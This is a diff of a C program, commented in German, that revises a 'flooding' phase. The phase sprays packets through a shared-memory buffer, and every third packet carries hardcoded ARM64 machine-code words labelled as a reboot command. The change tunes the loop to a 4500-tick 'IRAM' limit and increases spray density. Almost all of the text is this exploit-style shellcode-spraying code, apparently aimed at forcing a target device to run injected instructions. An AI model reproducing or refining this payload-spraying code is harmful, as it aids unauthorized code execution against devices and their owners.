@@ -78,35 +78,36 @@ int main(int argc, char *argv[]) {
         ReleaseMutex(hMutex);
         tick++;
     }
-
-    // Phase 3: Intelligentes Fluten
-    printf("[ SYSTEM ] Starte Flooding mit Reboot-Sprayer...\n");
-    while (tick < 10000) {
-        WaitForSingleObject(hMutex, INFINITE);
-    
-        if (!is_solo && shm_buffer[0] == 0x2A) {
-            ReleaseMutex(hMutex);
-            Sleep(1);
-            continue;
-        }
-
-        memset(local_packet, 0, BLOCK_SIZE);
-
-        if (tick % 50 == 0) {
-            unsigned int reboot_cmd[] = { 0xd280ed00, 0xf2a70000, 0x52800101, 0xb9000001 };
-            memcpy(&local_packet[0], reboot_cmd, sizeof(reboot_cmd));
-            local_packet[17] = 'S';
-        } else {
-            local_packet[15] = 'Y';
-            local_packet[16] = 'B';
-        }
-
-        local_packet[25] = 0xFF;
-        memcpy(shm_buffer + 1, local_packet, BLOCK_SIZE);
-        shm_buffer[0] = 0x2A;
-        ReleaseMutex(hMutex);
-        tick++;
-    }
+	// Phase 3: Intelligentes Fluten - Jetzt mit "Safe Zone" Limit
+	printf("[ SYSTEM ] Starte Flooding (Limit: 4500 Ticks für IRAM-Kompatibilität)...\n");
+	while (tick < 4500) { // Hier von 10000 auf 4500 runter!
+		WaitForSingleObject(hMutex, INFINITE);
+	
+		if (!is_solo && shm_buffer[0] == 0x2A) {
+			ReleaseMutex(hMutex);
+			continue;
+		}
+	
+		memset(local_packet, 0, BLOCK_SIZE);
+		local_packet[0] = 0x2A;
+	
+		// Erhöhe die Spray-Dichte, da wir weniger Platz haben
+		// Jedes 3. Paket ein Reboot-Versuch
+		if (tick % 3 == 0) {
+			unsigned int reboot_cmd[] = { 0xd280ed00, 0xf2a70000, 0x52800101, 0xb9000001 };
+			memcpy(&local_packet[1], reboot_cmd, sizeof(reboot_cmd));
+			local_packet[17] = 'S'; 
+		} else {
+			local_packet[15] = 'Y';
+			local_packet[16] = 'B';
+		}
+	
+		local_packet[25] = 0xFF;
+		memcpy(shm_buffer + 1, local_packet, BLOCK_SIZE);
+		shm_buffer[0] = 0x2A;
+		ReleaseMutex(hMutex);
+		tick++;
+	}
 
     // Ende
     WaitForSingleObject(hMutex, INFINITE);
